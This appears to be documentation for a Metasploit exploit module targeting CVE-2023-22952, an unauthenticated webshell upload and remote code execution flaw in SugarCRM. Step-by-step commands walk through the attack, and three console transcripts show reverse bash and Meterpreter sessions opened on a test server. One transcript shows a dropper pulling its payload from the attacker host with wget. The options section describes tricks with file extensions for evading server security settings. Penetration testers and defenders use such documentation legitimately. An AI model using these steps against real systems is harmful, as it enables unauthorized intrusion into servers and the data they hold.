## Vulnerable Application

This module exploits CVE-2023-22952, a Remote Code Execution (RCE) vulnerability in SugarCRM 11.0 Enterprise,
Professional, Sell, Serve, and Ultimate versions prior to `11.0.5` and SugarCRM 12.0 Enterprise, Sell, and
Serve versions prior to `12.0.2`.

The vulnerability occurs due to a lack of appropriate validation when uploading a malicious `PNG` file with
embedded PHP code to the `/cache/images/` directory on the web server using the vulnerable endpoint
`/index.php?module=EmailTemplates&action=AttachFiles`. Once uploaded to the server, depending on server configuration,
the attacker can access the malicious PNG file via HTTP or HTTPS, thereby executing the malicious PHP code and
gaining access to the system.

This vulnerability does not require authentication because there is a missing authentication check in the
`loadUser()` method in `include/MVC/SugarApplication.php`. After a failed login, the session does not get
destroyed and hence the attacker can continue to send valid requests to the application. See this
[AttackerKB Article](https://attackerkb.com/topics/E486ui94II/cve-2023-22952) for more details.

Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain
access to the underlying operating system as the user that the web services are running as (typically `www-data`).

Installing a vulnerable test bed requires a Linux machine with the vulnerable SugarCRM software loaded.
Follow instructions [here](https://support.sugarcrm.com/Documentation/Sugar_Versions/11.0/Ent/Installation_and_Upgrade_Guide/),
but you need to be registered as a sugarcrm customer in order to access the software.
This module has been tested against a SugarCRM installation with the specifications listed below:

* SugarCRM Enterprise Edition
* Version: `11.0.4`
* Build: `300`
* Linux OS: Debian 8.6

## Verification Steps

1. `use exploit/multi/http/sugarcrm_webshell_cve_2023_22952`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `set LHOST <attacker host ip>`
1. `set LPORT <attacker host port>`
1. `set TARGET <0-PHP, 1-Unix command or 2-Linux Dropper>`
1. `exploit`
1. You should get a `bash` shell or `meterpreter` session depending on the target and payload settings.

## Options

### WEBSHELL
You can use this option to set the filename and extension of the webshell.
This is handy if you want to test the webshell upload and execution with different file extensions (.phtml, .php7, .inc)
to bypass any security settings on the Web and PHP server.

### COMMAND
This option provides the user to choose the PHP underlying shell command function to be used for execution.
The choices are `system()`, `passthru()`, `shell_exec()` and `exec()` and it defaults to `passthru()`.
This option is only available when the target selected is either Unix Command or Linux Dropper.
For the native PHP target, by default the `eval()` function will be used for native PHP code execution.

## Scenarios

### SugarCRM 11.0.4 Enterprise Build 300 on Debian 8.6 - PHP Meterpreter session
```
msf6 > use exploit/multi/http/sugarcrm_webshell_cve_2023_22952
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > options

Module options (exploit/multi/http/sugarcrm_webshell_cve_2023_22952):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       SugarCRM base url
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host
   WEBSHELL                    no        The name of the webshell with extension to trick the parser like .phtml, .phar, etc. Webshell
                                         name will be randomly generated if left unset.


   When TARGET is not 0:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMMAND  passthru         yes       Use PHP command function (Accepted: passthru, shell_exec, system, exec)


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set rhosts 192.168.100.180
rhosts => 192.168.100.180
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lhost 192.168.100.254
lhost => 192.168.100.254
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lport 4444
lport => 4444
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set target 0
target => 0
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > exploit

[*] Started reverse TCP handler on 192.168.100.254:4444
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (39927 bytes) to 192.168.100.180
[+] Deleted cXSbMSaTtcnn.phtml
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:52584) at 2023-02-15 14:11:23 +0000

meterpreter > sysinfo
Computer     : sugarcrm
OS           : Debian 8.6 (Linux 2.6.32)
Meterpreter  : php/linux
meterpreter > getuid
Server username: www-data
meterpreter > exit
```

### SugarCRM 11.0.4 Enterprise Build 300 on Debian 8.6 - bash reverse shell
```
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set rhosts 192.168.100.180
rhosts => 192.168.100.180
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lhost 192.168.100.254
lhost => 192.168.100.254
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lport 4444
lport => 4444
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set target 1
target => 1
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > exploit

[*] Started reverse TCP handler on 192.168.100.254:4444
[*] Executing Unix Command for cmd/unix/reverse_bash
[+] Deleted RPXrYGLCvGjL.phar
[*] Command shell session 2 opened (127.0.0.1:4444 -> 127.0.0.1:52584) at 2023-01-19 19:14:56 +0000

whoami
www-data
exit
```

### SugarCRM 11.0.4 Enterprise Build 300 on Debian 8.6 - Linux Meterpreter session
```
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set rhosts 192.168.100.180
rhosts => 192.168.100.180
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lhost 192.168.100.254
lhost => 192.168.100.254
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set lport 4444
lport => 4444
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > set target 2
target => 2
msf6 exploit(multi/http/sugarcrm_webshell_cve_2023_22952) > exploit

[*] Started reverse TCP handler on 192.168.100.254:4444
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://192.168.100.254:8080/aLYDt2
[*] Client 127.0.0.1 (Wget/1.16 (linux-gnu)) requested /aLYDt2
[*] Sending payload to 127.0.0.1 (Wget/1.16 (linux-gnu))
[*] Sending stage (3045348 bytes) to 127.0.0.1
[+] Deleted ZxGTSVGsOUZs.phtml
[*] Meterpreter session 3 opened (127.0.0.1:4444 -> 127.0.0.1:43076) at 2023-01-19 19:16:07 +0000
[*] Command Stager progress - 100.00% done (121/121 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : sugarcrm
OS           : Debian 8.6 (Linux 2.6.32)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: www-data
meterpreter > exit
```

## Limitations
No `check` method.
